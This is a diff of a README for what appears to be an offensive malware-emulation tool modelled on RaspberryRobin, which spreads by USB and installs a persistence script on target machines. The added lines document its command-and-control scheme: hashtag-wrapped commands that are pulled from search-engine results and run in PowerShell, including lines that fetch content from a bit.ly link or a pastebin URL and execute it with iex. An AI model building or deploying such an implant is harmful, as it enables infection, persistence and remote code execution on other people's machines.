@@ -6,9 +6,15 @@ Your own RaspberryRobin Emulation, infect USB and get the payload from de intern
 
 Just clone, execute CUCHIBERRYROBIN_CONFIGURATOR.ps1 and then install tmp/Persister.ps1 in the target machine to be infected.
 
-Sorry 4 all the rubbish in the folders, will clean soon.
+Diferent types of commands:
+
+(always exeutes powershell):
+
+#CUCHIBERRYROBIN calc.exe #FIN => executes calc.exe
+
+#10CUCHIBERRYROBIN $ https://bit.ly/3kJjNqK #FIN => $ means iex of the content of the URL
+
+#9CUCHIBERRYROBIN ñC https://pastebin.com/raw/R6sTE0GK #FIN => ñC means same as $ but should have a digital signature of the commands (avoid hijacking the network)
 
 
-It downloads the commands from BING or google after doing a search with the hashtag. The sample hashtag is #CUCHIBERRYROBIN. 
 
-It supports commands and also signature of the commands.
